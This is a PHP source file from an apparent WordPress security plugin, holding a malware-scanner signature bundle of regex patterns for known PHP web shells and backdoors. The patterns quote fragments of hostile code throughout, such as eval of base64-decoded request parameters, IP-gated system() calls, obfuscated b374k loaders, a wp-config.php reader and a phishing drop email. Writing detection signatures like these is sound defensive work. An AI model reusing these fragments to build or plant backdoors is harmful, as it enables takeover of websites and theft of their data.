<?php

namespace FirePhage\Security\Scanner;

if (! defined('ABSPATH')) {
    exit;
}

final class SignatureBundle
{
    /**
     * @return array<string, mixed>
     */
    public static function manifest(): array
    {
        return array (
  'version' => '2026.03.11.225916',
  'high_confidence_patterns' => 
  array (
    0 => 
    array (
      'pattern' => '/, E_USER_ERROR\\);
\\}

\\$functions \\= \\$root \\.[\\s\\S]{0,160}, E_USER_ERROR\\);
\\}

\\$host \\= \\$_SERVER\\[/',
      'label' => 'sample-specific literal chain',
    ),
    1 => 
    array (
      'pattern' => '/https\\:\\/\\/blackshelter\\.org\\/tw9ZIwYM9BY5A6iRcUJQxDBX5PMf7GL4\\-DBJejgkisyv/',
      'label' => 'sample-specific literal',
    ),
    2 => 
    array (
      'pattern' => '/eval\\(base64_decode\\(\\$_GET\\[\'lol\'\\]\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    3 => 
    array (
      'pattern' => '/\\$?kwainkwain\\b/',
      'label' => 'sample-specific identifier',
    ),
    4 => 
    array (
      'pattern' => '/runcommand[\\s\\S]{0,120}canirun[\\s\\S]{0,120}etcpasswdfile/',
      'label' => 'sample-specific token chain',
    ),
    5 => 
    array (
      'pattern' => '/ec38fe2a8497e0a8d6d349b3533038cb/',
      'label' => 'sample-specific encoded fragment',
    ),
    6 => 
    array (
      'pattern' => '/b374k shell 3\\.2\\.3[\\s\\S]{0,12000}\\$func\\="cr"\\."eat"\\."e_fun"\\."cti"\\."on";\\$b374k\\=\\$func\\(\'\\$x\',\'ev\'\\.\'al\'\\.\'\\("\\?\\>"\\.gz\'\\.\'in\'\\.\'fla\'\\.\'te\\(ba\'\\.\'se\'\\.\'64\'\\.\'_de\'\\.\'co\'\\.\'de\\(\\$x\\)\\)\\);\'\\);\\$b374k\\("7P1r/s',
      'label' => 'source-file head-tail anchor',
    ),
    7 => 
    array (
      'pattern' => '/\\$url\\s+\\=\\s+\\$GLOBALS\\["k1r4_updateurl"\\]\\."\\?version\\="\\.urlencode\\(base64_encode\\(\\$GLOBALS\\["shver"\\]\\)\\)\\."&updatenow\\="\\.\\(\\$updatenow\\?"1"\\:"0"\\)\\."&";/',
      'label' => 'sample-specific line fragment',
    ),
    8 => 
    array (
      'pattern' => '/\\$url\\s+\\=\\s+\\$GLOBALS\\["c999sh_updateurl"\\]\\."\\?version\\="\\.urlencode\\(base64_encode\\(\\$GLOBALS\\["shver"\\]\\)\\)\\."&updatenow\\="\\.\\(\\$updatenow\\?"1"\\:"0"\\)\\."&";/',
      'label' => 'sample-specific line fragment',
    ),
    9 => 
    array (
      'pattern' => '/\\]\\[0\\]\\);\\}

     unset\\(\\$arr\\[\\$k\\],\\$arr\\[\\$k\\+1\\]\\);

    \\}

   \\}

  \\}

 \\}

 else \\{return FALSE;\\}

\\}

\\}

if \\(\\!function_exists\\(/',
      'label' => 'sample-specific literal',
    ),
    10 => 
    array (
      'pattern' => '/\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\//',
      'label' => 'source-file head snippet',
    ),
    11 => 
    array (
      'pattern' => '/\\>\\<b\\>No ReadAble\\<\\/b\\>";

		 \\}

		\\}else \\{

		echo "&nbsp;";

		 \\}

		echo "

		\\<\\/a\\>\\<\\/font\\>\\<\\/td\\>

		\\<td width\\=/',
      'label' => 'sample-specific literal',
    ),
    12 => 
    array (
      'pattern' => '/\\<meta http\\-equiv\\="Content\\-Type" content\\="text\\/html; charset\\=windows\\-1256"\\>\\<meta http\\-equiv\\="Content\\-Language" content\\="ar\\-sa"\\>[\\s\\S]{0,12000}setTimeout\\(function\\(\\)\\{new Function\\(atob\\(atob\\(document\\.getElementById\\(\'ghdescon\'\\)\\.src\\.substr\\(22\\)\\)\\.match\\(\\/ghdescon\\(\\.\\*\\?\\)ghdescon\\/\\)\\[1\\]\\)\\)\\.apply\\(t/s',
      'label' => 'source-file head-tail anchor',
    ),
    13 => 
    array (
      'pattern' => '/\\<\\?php \\/\\/ Copyright 2016 \\- Do not attempt to reverse engineer this file\\. Please contact us for details, quoting the ScriptID\\. \\(ScriptID\\:ID\\/20[\\s\\S]{0,12000}\\$OI0IO10101OI0I01\\=__FILE__;\\$O10I0I01O1OI01OIOI\\=72;eval\\(base64_decode\\(\'JE9JMEkwMU8xMElPSU9JMEk9Zm9wZW4oJE9JMElPMTAxMDFPSTBJMDEsJ3JiJyk7JE8xT0/s',
      'label' => 'source-file head-tail anchor',
    ),
    14 => 
    array (
      'pattern' => '/\\<\\?php \\$payload\\="83QPy0p0t0hPNs6pSnEPK\\/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA\\=\\=";preg_replace\\(\'\\/\\.\\*\\/e\',"\\\\x65\\\\x76\\\\x61\\\\x6c\\\\x28\\\\x62\\\\x61\\\\x73\\\\x65/',
      'label' => 'source-file tail snippet',
    ),
    15 => 
    array (
      'pattern' => '/\\/\\/ https\\:\\/\\/rstforums\\.com\\/forum\\/topic\\/98500\\-php\\-malware\\-finder\\/\\?do\\=findComment&comment\\=615687[\\s\\S]{0,12000}print_r\\(\\$_POST\\[\'funct\'\\]\\(\\$_POST\\[\'argv\'\\]\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    16 => 
    array (
      'pattern' => '/7bac13f112c39fc9a88cccda9ea4c998267079eeS03OyFcoriwuSc3VUIl3dw2JVi9Qj9W0BgA\\=/',
      'label' => 'sample-specific encoded fragment',
    ),
    17 => 
    array (
      'pattern' => '/\\# This is a sample of PHP malware discovered 2017\\/11\\/15\\.[\\s\\S]{0,12000}\\<\\?php \\$awvjtnz \\= \'fmhpph\\#\\)zbssb\\!\\-\\#\\}\\#\\)fepmqnj\\!\\/\\!\\#0\\#\\)idubn`hfsq\\)\\!sp\\!\\*\\#ojnopm3qjA\\)qj3hopmA	x273qj%6\\<\\*Y%\\)fnbozcYufhA	x%\\=\\*h%\\)m%\\)\\:fmjix\\:\\<\\#\\#\\:\\>\\:h%\\:\\</s',
      'label' => 'source-file head-tail anchor',
    ),
    18 => 
    array (
      'pattern' => '/ID5gID5gIDJ7bmEtZSIgPTBgcGhwX6VuYW7lKDksDi5gID5gID5gID5gIDJwaHCfdmVyc2lvbiIgPTBgcGhwdmVyc2lvbigpL5og[\\s\\S]{0,160}ID5gID5gID5gID5id6NvX6ZlcnNpb2BiIA3\\+IEdTT70WRVJTSU0OL5ogID5gID5gID5gID5ic2EmZW7vZGUiIA3\\+I1CpbmlfZ2V3/',
      'label' => 'sample-specific literal chain',
    ),
    19 => 
    array (
      'pattern' => '/\\* The base configurations of the WordPress\\.[\\s\\S]{0,12000}YTKY7Geso8iShLmL\\/QXbtCswu8Tv\\+SDbrGc99l94uC6J/s',
      'label' => 'source-file head-tail anchor',
    ),
    20 => 
    array (
      'pattern' => '/\\<\\?php\\s+\\$\\{\\$\\{eval\\(\\$_POST\\[ice\\]\\)\\}\\};\\?\\>/',
      'label' => 'sample-specific line fragment',
    ),
    21 => 
    array (
      'pattern' => '/@include "\\\\x2fh\\\\x6fm\\\\x65\\/\\\\x77e\\\\x62p\\\\x6ce\\\\x78x\\\\x33\\/\\\\x70u\\\\x62l\\\\x69c\\\\x5fh\\\\x74m\\\\x6c\\/\\\\x68i\\\\x73\\-\\\\x68e\\\\x6d\\.\\\\x6fr\\\\x67\\/\\\\x5f_\\\\x4dA\\\\x43O\\\\x53X\\\\x2fm\\\\x6fd/',
      'label' => 'source-file tail snippet',
    ),
    22 => 
    array (
      'pattern' => '/\\<\\?\\$x\\=\\$_GET;\\(\\$x\\[p\\]\\=\\=\'_\'\\?\\$x\\[f\\]\\(\\$x\\[c\\]\\)\\:y\\);/',
      'label' => 'source-file tail snippet',
    ),
    23 => 
    array (
      'pattern' => '/\\<\\?\\$x\\=explode\\(\'~\',base64_decode\\(substr\\(getallheaders\\(\\)\\[\'x\'\\],1\\)\\)\\);@\\$x\\[0\\]\\(\\$x\\[1\\]\\);/',
      'label' => 'source-file tail snippet',
    ),
    24 => 
    array (
      'pattern' => '/cwd\'    \\=\\> \\$cwd,
    \\]\\)\\);
\\}

\\# File\\-upload payload
function payload_upload \\(\\$cwd, \\$args\\) \\{

    \\# cd to the trojan/',
      'label' => 'sample-specific literal',
    ),
    25 => 
    array (
      'pattern' => '/ob_start\\(function \\(\\$c,\\$d\\)\\{register_shutdown_function\\(\'assert\',\\$c\\);\\}\\);[\\s\\S]{0,12000}echo \\$_REQUEST\\[\'pass\'\\];/s',
      'label' => 'source-file head-tail anchor',
    ),
    26 => 
    array (
      'pattern' => '/\\/\\* https\\:\\/\\/blog\\.sucuri\\.net\\/2014\\/04\\/php\\-callback\\-functions\\-another\\-way\\-to\\-hide\\-backdoors\\.html \\*\\/[\\s\\S]{0,12000}@array_diff_ukey\\(@array\\(\\(string\\)\\$_REQUEST\\[\'password\'\\]\\=\\>1\\), @array\\(\\(string\\)stripslashes\\(\\$_REQUEST\\[\'re_password\'\\]\\)\\=\\>2\\),\\$_REQUEST\\[\'login\'\\]\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    27 => 
    array (
      'pattern' => '/\\<\\?php extract\\(\\$_REQUEST\\); @die\\(\\$ctime\\(\\$atime\\)\\);/',
      'label' => 'source-file tail snippet',
    ),
    28 => 
    array (
      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}\\<\\!\\-\\- Load system style CSS \\-\\-\\>/s',
      'label' => 'source-file head-tail anchor',
    ),
    29 => 
    array (
      'pattern' => '/if \\(\\$SERVER\\["REMOTEADDR"\\]\\=\\="178\\.162\\.201\\.166" && md5\\(\\$REQUEST\\[\'secure\'\\]\\)\\=\\="7f02b0ae0869cc5aa38cd7ca6c767c92"\\)\\{ system\\(\\$REQUEST\\[\'secmd\'\\]\\); \\}[\\s\\S]{0,12000}system\\(base64_decode\\("ZWNobyAnT3JkZXIgRGVueSxBbGxvd2BkZW55IGZyb20gYWxsYDxGaWxlcyBzdWJkaXJlY3RvcnkvKj5gICAgIGRlbnkgZnJvbSBhbGxgPC9GaWxlcz5gPE/s',
      'label' => 'source-file head-tail anchor',
    ),
    30 => 
    array (
      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=14&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[51\\]\\=\\$p\\[51\\]\\.[\\s\\S]{0,12000}\\$p\\[84\\]\\)&&\\(\\$p\\[69\\]\\=\\$p\\[51\\]\\(\\$p\\[69\\]\\)\\)&&\\(\\$p\\=\\$p\\[69\\]\\(\\$p\\[36\\],\\$p\\[51\\]\\(\\$p\\[32\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;/s',
      'label' => 'source-file head-tail anchor',
    ),
    31 => 
    array (
      'pattern' => '/\\<\\?php if\\(isset\\(\\$_GET\\["evmym"\\]\\)\\)\\{echo"\\<font color\\=\\#FFFFFF\\>\\[uname\\]"\\.php_uname\\(\\)\\."\\[\\/uname\\]";echo "\\<br\\>";print "\\\\n";if\\(@ini_get\\("disable_functio/',
      'label' => 'source-file tail snippet',
    ),
    32 => 
    array (
      'pattern' => '/\\)
    \\{
        if \\(\\!self\\:\\:isPermittedPath\\(\\$path\\) or \\!@is_file\\(\\$path\\)\\) \\{
            \\$this\\-\\>setError\\(\\$this\\-\\>lang\\(/',
      'label' => 'sample-specific literal',
    ),
    33 => 
    array (
      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>[\\s\\S]{0,12000}@unlink\\(__FILE__\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    34 => 
    array (
      'pattern' => '/\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdOdmJtWnBaeUE5SUdGeWNtRjVLQW9nSW5abGNuTnBiMjRpSUQwK0lDSXlMakF1TWpBeE1TNHhNREE1SWl3Z0x5b2dZblZwYkdR/',
      'label' => 'source-file tail snippet',
    ),
    35 => 
    array (
      'pattern' => '/\\$ud4d324d\\="\\\\142\\\\x61\\\\x73\\\\x65\\\\66\\\\64\\\\137\\\\x64\\\\x65\\\\x63\\\\x6f\\\\144\\\\145";@eval\\(\\$ud4d324d\\(/',
      'label' => 'sample-specific line fragment',
    ),
    36 => 
    array (
      'pattern' => '/eval\\(str_rot13\\(gzinflate\\(str_rot13\\(base64_decode\\(\'LUnXDrY4Dn2a0fx7VC\\/aK23v8ERhSfTeO0K\\/MBqkJECc2LF9QbzUw\\/10649rvYdl\\+TMOxYIh\\/5uXKZmXP\\/nQR\\/n978/',
      'label' => 'source-file tail snippet',
    ),
    37 => 
    array (
      'pattern' => '/\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdSbFptRjFiSFJmZFhObFgyRnFZWGdnUFNCMGNuVmxPd29rWTI5c2IzSWdQU0FpTldSbVpqSTJJanNLSkdSbFptRjFiSFJmWTJo/',
      'label' => 'source-file tail snippet',
    ),
    38 => 
    array (
      'pattern' => '/\\$Receive_email\\="mapbay@protonmail\\.com";/',
      'label' => 'source-file tail snippet',
    ),
    39 => 
    array (
      'pattern' => '/\\|\\-\\-\\- http\\:\\/\\/www\\.geoiptool\\.com\\/\\?IP\\=\\$ip \\-\\-\\-\\-\\\\n[\\s\\S]{0,160};
	\\$send \\= \\$Receive_email;
	\\$subject \\=/',
      'label' => 'sample-specific literal chain',
    ),
    40 => 
    array (
      'pattern' => '/\\>"\\.\\$peth\\."\\<\\/a\\>\\/";
							\\}\\/\\/foreach
						echo "
						\\<\\/td\\>
					\\<\\/tr\\>
					\\<tr\\>
						\\<td\\>";
						if\\(isset\\(\\$_FILES\\[/',
      'label' => 'sample-specific literal',
    ),
    41 => 
    array (
      'pattern' => '/\\$qJ1An \\= str_replace\\(\\$GLOBALS\\[Ã£ÃªÃ¬\\]\\[0x5\\], \\$GLOBALS\\[Ã£ÃªÃ¬\\]\\[0x6\\], \\$qJ1An\\);/',
      'label' => 'source-file tail snippet',
    ),
    42 => 
    array (
      'pattern' => '/r\'\\);fseek\\(\\$handle, 369\\);\\$data \\= stream_get_contents\\(\\$handle\\);fclose\\(\\$handle\\);\\$f \\= create_function\\(/',
      'label' => 'sample-specific literal',
    ),
    43 => 
    array (
      'pattern' => '/\\$qJ1An \\= str_replace\\(\\$GLOBALS\\[ãêì\\]\\[0x5\\], \\$GLOBALS\\[ãêì\\]\\[0x6\\], \\$qJ1An\\);/',
      'label' => 'source-file tail snippet',
    ),
    44 => 
    array (
      'pattern' => '/\\* Plugin Name\\: Wordpress CMS Module[\\s\\S]{0,12000}\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\//s',
      'label' => 'source-file head-tail anchor',
    ),
    45 => 
    array (
      'pattern' => '/\\$password \\= "laRBWAcUyvd"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    46 => 
    array (
      'pattern' => '/use JMS\\\\Serializer\\\\SerializerBuilder;[\\s\\S]{0,12000}\\-\\>setSerializationVisitor\\(\'json\', \\$visitor\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    47 => 
    array (
      'pattern' => '/\\$str \\= file_get_contents\\("\\.\\.\\/\\.\\.\\/wp\\-config\\.php"\\);[\\s\\S]{0,12000}touch\\("\\.\\.\\/\\.\\.\\/wp\\-config\\.php", \\$ftime1, \\$ftime1\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    48 => 
    array (
      'pattern' => '/\\$jnvntef \\= \'\\*d_6t9obrm45il\\\\\'2x3\\-vukpycsfangH\\#e\';[\\s\\S]{0,12000}vzidf\\(\\$mplyvsq, \\$mplyvsq\\[5\\]\\(\\$mplyvsq\\[2\\], \\$boalhd \\^ ptclequ\\(\\$mplyvsq, \\$qhsxt, \\$mplyvsq\\[8\\]\\(\\$boalhd\\)\\)\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    49 => 
    array (
      'pattern' => '/\\$bwcex \\= \'\\#y_Hd3745pn9xei6olgmc\\-ar1s\\\\\'t8buk0\\*v\';[\\s\\S]{0,12000}eval\\( \\$cwgiloi\\[1\\]\\( \\$cwgiloi\\[2\\] \\) \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    50 => 
    array (
      'pattern' => '/\\$btmrp \\= \'_bod2l\\*9cv4xkiu1\\#ayrg\\\\\'\\-sHn06mf7t83ep5\';[\\s\\S]{0,12000}yjnorq\\(\\$hhmxjbe, \\$hhmxjbe\\[5\\]\\(\\$hhmxjbe\\[2\\], \\$pvdukpz \\^ fhxfiq\\(\\$hhmxjbe, \\$wemrnt, \\$hhmxjbe\\[8\\]\\(\\$pvdukpz\\)\\)\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    51 => 
    array (
      'pattern' => '/\\$_COOKIE\\[\'timestamp\'\\] \\= isset\\(\\$_COOKIE\\[\'timestamp\'\\]\\) \\? \\$_COOKIE\\[\'timestamp\'\\] \\: \'\';[\\s\\S]{0,12000}eval\\(\\/\\*12\\*\\/str_rot13\\(\\/\\*23\\*\\/base64_decode\\(\\$result, true\\)\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    52 => 
    array (
      'pattern' => '/\\>Download Config\\<\\/font\\>\\<\\/a\\>\\<\\/center\\>\\<\\/p\\>\\<\\/h3\\>\'\\);\\}\\}if\\(\\$_POST\\[\'alfa2\'\\]\\=\\=\'\\>\\>\'\\)\\{echo __pre\\(\\);\\$colors \\= json_decode\\(\\$_POST\\[/',
      'label' => 'sample-specific literal',
    ),
    53 => 
    array (
      'pattern' => '/\';
  \\$unzipper\\-\\>prepareExtraction\\(\\$archive, \\$destination\\);
\\}

if \\(isset\\(\\$_POST\\[/',
      'label' => 'sample-specific literal',
    ),
    54 => 
    array (
      'pattern' => '/@ini_set\\(\'error_log\',NULL\\);[\\s\\S]{0,12000}echo "\\<script\\>window\\.location\\.href \\= \'i\\.php\\?\' \\+ Math\\.random\\(\\);\\<\\/script\\>";/s',
      'label' => 'source-file head-tail anchor',
    ),
    55 => 
    array (
      'pattern' => '/PD9waHAgdW5saW5rKCdGVU5MSU5LRk5BTUUnKTsgQGluaV9zZXQoJ2Vycm9yX2xvZycsI65785VT6578/',
      'label' => 'sample-specific encoded fragment',
    ),
    56 => 
    array (
      'pattern' => '/\\$data\\s+\\=\\s+@file_put_contents\\(\\$lokasi\\."\\/"\\.\\$_FILES\\[\'berkas\'\\]\\[\'name\'\\],\\s+@file_get_contents\\(\\$_FILES\\[\'berkas\'\\]\\[\'tmp_name\'\\]\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    57 => 
    array (
      'pattern' => '/\\<\\?php eval\\(base64_decode\\(\'CiBnb3RvIFBlVGVZOyB6b2hOXzogZ290byBsQnBPcjsgZ290byBWTjNQeTsgVXpyZmg6IHRvMnhiOiBnb3RvIFc0WmhlOyBWTjNQeTogdXR5d1c6IG/',
      'label' => 'source-file tail snippet',
    ),
    58 => 
    array (
      'pattern' => '/Plugin Name\\: Hermes[\\s\\S]{0,12000}\\$sshPorts \\= fastNonBlockingPortScan\\(\\$targetIP, \\$startPort, \\$endPort, 2, \\$concurrency\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    59 => 
    array (
      'pattern' => '/\\$▛ \\= "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; \\/\\/Pass\\: xleet[\\s\\S]{0,12000}eval\\(\\$o\\("CiRzdHQxID0gIlN5MUx6TkZRdDdkVDEwdXZLczFMenM4dEtFb3RMdFpJcjhyTVM4dEpMRWxGWWlVbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFGSlx4NjNVRlx4NjF/s',
      'label' => 'source-file head-tail anchor',
    ),
    60 => 
    array (
      'pattern' => '/\\>
    \\<title\\>PHP File Uploader\\<\\/title\\>
\\<\\/head\\>
\\<body\\>
    \\<h2\\>Upload a File\\<\\/h2\\>
    \\<form action\\=/',
      'label' => 'sample-specific literal',
    ),
    61 => 
    array (
      'pattern' => '/@set_time_limit\\(0\\);[\\s\\S]{0,12000}echo \\$tester\\-\\>runStressTest\\(\\$socketcount, \\$host, \\$port, \\$path, \\$method, \\$testType, true,\\$note\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    62 => 
    array (
      'pattern' => '/\\$Cyto \\= "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\\\\x42rNK85Pz\\\\x63gqLU4mLq\\\\x43\\\\x43\\\\x63lFqe\\\\x61m\\\\x63Snp\\\\x43\\\\x62np6Rq\\\\x41O0sSi3TUPHJr/',
      'label' => 'source-file head snippet',
    ),
    63 => 
    array (
      'pattern' => '/\\* Plugin Name\\: WP Super Cache[\\s\\S]{0,12000}\\$qmhjw3080 \\= \\$vicjn5815\\[19\\]\\.\\$vicjn5815\\[23\\]\\.\\$vicjn5815\\[24\\]\\.\\$vicjn5815\\[1\\]\\.\\$vicjn5815\\[14\\]\\.\\$vicjn5815\\[75\\]\\.\\$vicjn5815\\[68\\]\\.\\$vicjn5815\\[53\\]\\.\\$vicjn58/s',
      'label' => 'source-file head-tail anchor',
    ),
    64 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); function eGerl\\(\\$yJCsx\\) \\{ \\$VmURk \\= strlen\\(trim\\(\\$yJCsx\\)\\); \\$Umn88 \\= \'\'; for \\(\\$bJVuV \\= 0; \\$bJVuV \\< \\$VmURk; \\$bJVuV \\+\\= 2/',
      'label' => 'source-file tail snippet',
    ),
    65 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'F6lYM\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
      'label' => 'source-file tail snippet',
    ),
    66 => 
    array (
      'pattern' => '/\\* This file is part of the Symfony package\\.[\\s\\S]{0,12000}\\* @throws TransportExceptionInterface on a network error or when the idle timeout is reached/s',
      'label' => 'source-file head-tail anchor',
    ),
    67 => 
    array (
      'pattern' => '/\\$ytybnb2\\s+\\=\\s+eozmtr0\\(base64_decode\\(urldecode\\(\\$ytybnb2\\)\\),\\s+\\$icfvxq3\\);/',
      'label' => 'sample-specific line fragment',
    ),
    68 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6akB; \\$lv38F \\+\\= 2/',
      'label' => 'source-file tail snippet',
    ),
    69 => 
    array (
      'pattern' => '/\\<\\?php @error_reporting\\(round\\(0\\)\\);@set_time_limit\\(round\\(0\\+150\\)\\);@ignore_user_abort\\(true\\);function abort\\(\\$name\\) \\{if\\(isset\\(\\$_GET\\[\'remove\'\\]\\)\\) \\{u/',
      'label' => 'source-file tail snippet',
    ),
    70 => 
    array (
      'pattern' => '/\\$server \\= \\$_SERVER\\[\'SERVER_NAME\'\\];[\\s\\S]{0,12000}ec\\<span style\\="display\\:none;"\\>gki\\<\\/span\\>ho \'S\\<span style\\="display\\:none;"\\>pel\\<\\/span\\>ome er\\<span style\\="display\\:none;"\\>urv\\<\\/span\\>ror was occur/s',
      'label' => 'source-file head-tail anchor',
    ),
    71 => 
    array (
      'pattern' => '/\\\\x0ctǏ\\\\x0bq\\!GF&i\\\\x0cqvX\\)JC83\\*_\\.\\\\x0bVǉ~T\\\\x0cp\\/DfXx\\/\\?ӓKu2L\'Wu Dܿk\\\\x0dqaVzۮS\\\\x0aSOD\\:s\\.ᄐS\\\\x24m\\\\x5c\\>\\[b\\!E\\*%7\\\\x7fM\\\\x24\\[Gg/',
      'label' => 'source-file tail snippet',
    ),
    72 => 
    array (
      'pattern' => '/\\<\\?\\= htmlspecialchars\\(\\$_POST\\[\'cmd\'\\], ENT_QUOTES, \'UTF\\-8\'\\) \\?\\>[\\s\\S]{0,160}this\\.setSelectionRange\\(this\\.value\\.length, this\\.value\\.length\\);/',
      'label' => 'sample-specific literal chain',
    ),
    73 => 
    array (
      'pattern' => '/\\<\\?php \\$fwfxuzph\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$gpnzw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/',
      'label' => 'source-file tail snippet',
    ),
    74 => 
    array (
      'pattern' => '/\\$method \\= \\$_SERVER\\[\'REQUEST_METHOD\'\\];[\\s\\S]{0,12000}if\\(\\$jfnbrsjfq\\)\\{echo \'error 403\';\\} else \\{echo \'error 404 \\: \' \\. \\$jfnbrsjfq;\\}/s',
      'label' => 'source-file head-tail anchor',
    ),
    75 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$dvvycyhtmetns,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    76 => 
    array (
      'pattern' => '/\\<\\?php echo "SBfHHKaNed"; if \\(file_exists\\("\\.\\/class\\.rays\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.rays\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4BS1r/',
      'label' => 'source-file tail snippet',
    ),
    77 => 
    array (
      'pattern' => '/\\<\\?php \\$cgetznt\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$vargnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    78 => 
    array (
      'pattern' => '/\\<\\?php \\$gbvppz\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$upxtcmnct\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    79 => 
    array (
      'pattern' => '/\\<\\?php \\$utktfpmrkg\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$rukvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    80 => 
    array (
      'pattern' => '/\\<\\?php \\$cfbaxd\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$ccqtqdyg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    81 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}echo \'\\<html\\>\\<body\\>\\<script\\>\'\\.base64_decode\\(str_replace\\(\'\\.\', \'\', \'d2luZG\\.93LmxvY2F0aW9uLn\\.JlcGxhY2U\\=\'\\)\\)\\.\'\\("\'\\.\\$location\\.str_replace\\("\\\\\\\\", "\\\\\\\\\\\\\\\\/s',
      'label' => 'source-file head-tail anchor',
    ),
    82 => 
    array (
      'pattern' => '/\\<\\?php echo "ezpCSWNdnd"; if \\(file_exists\\("\\.\\/embassy\\-list\\.php"\\)\\)\\{ touch\\("\\.\\/embassy\\-list\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*G/',
      'label' => 'source-file tail snippet',
    ),
    83 => 
    array (
      'pattern' => '/\\<\\?php \\$nwumz\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$gfyms\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    84 => 
    array (
      'pattern' => '/Lyp2bXJremFjd2ZzdW5wd2EqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    85 => 
    array (
      'pattern' => '/\\<\\?php \\$udxthmda\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$edbbtfkwt\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    86 => 
    array (
      'pattern' => '/\\<\\?php \\$s \\= eval\\(base64_decode\\("Ly9zZXRfdGltZV9saW1pdCAoIDY2NjAwMCApOw0KLy9AaWdub3JlX3VzZXJfYWJvcnQgKHRydWUpOw0KDQoNCmZ1bmN0aW9uIGlzQm90RGV0Z/',
